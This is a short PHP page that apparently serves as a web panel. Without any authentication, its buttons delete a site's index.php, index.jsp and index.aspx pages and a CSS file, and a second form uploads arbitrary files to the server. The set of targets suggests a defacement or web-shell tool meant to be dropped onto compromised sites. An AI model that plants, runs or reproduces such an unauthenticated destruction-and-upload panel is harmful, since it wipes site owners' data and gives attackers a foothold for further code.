<?php
if(isset($_POST['Submit'])){
$filename = '../css/ace.min.css';
if (file_exists($filename)) {

    echo "The file $filename Deleted";
	unlink($filename);
	
} else 
   echo "Sorry, The file $filename does not  exists";

}
?>
<?php
if(isset($_POST['Submit1'])){

$filename1 = './index.php';

if (file_exists($filename1)) {

    echo "The file $filename1 Deleted";
	
	unlink($filename1);
	
} else 
   echo "Sorry, The file $filename1 does not exists";

}
?>
<?php
if(isset($_POST['Submit2'])){

$filename2 = './index.jsp';

if (file_exists($filename2)) {

    echo "The file $filename2 Deleted";
	
	unlink($filename2);
	
} else 
   echo "Sorry, The file $filename2 does not exists";

}
?>
<?php
if(isset($_POST['Submit3'])){

$filename3 = './index.aspx';
if (file_exists($filename3)) {

    echo "The file $filename3 Deleted";
	
	unlink($filename3);
} else 
   echo "Sorry, The file $filename3 does not exists";

}
?>

<form name="form1" method="post" action="data.php">
  
  <p>
    <input type="submit" name="Submit" value="you want delete the ace.min.css file">
	<input type="submit" name="Submit1" value="you want delete the index.php file">
	<input type="submit" name="Submit2" value="you want delete the index.jsp file">
	<input type="submit" name="Submit3" value="you want delete the index.aspx file">
    <label>
    
    </label>
  </p>
</form>
<form  name="frm" method="post" action="files.php" enctype="multipart/form-data">
<p>Enter the file Name Which you want to Upload:-  </p> 
    <label>
    <input type="file" name="f1">
    </label>
	<input name="upload" type="submit"  value="Upload" />
</form>
